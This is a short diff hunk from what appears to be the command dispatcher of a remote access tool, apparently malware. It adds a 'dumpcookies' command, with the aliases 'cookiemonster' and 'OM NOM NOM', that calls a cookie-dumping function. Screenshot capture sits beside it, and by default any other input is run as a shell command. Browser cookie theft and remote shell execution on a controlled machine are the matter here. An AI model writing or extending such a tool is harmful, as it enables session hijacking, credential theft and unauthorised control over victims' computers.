@@ -201,6 +201,9 @@ help - This menu!
 				
 		elif data == "screenshot":
 			return info.take_screenshot
+			
+		elif data == "dumpcookies" or data == "cookiemonster" or data == "OM NOM NOM":
+			return info.dump_cookies
 
 		else:
 			return execute.execute_shell_command, data
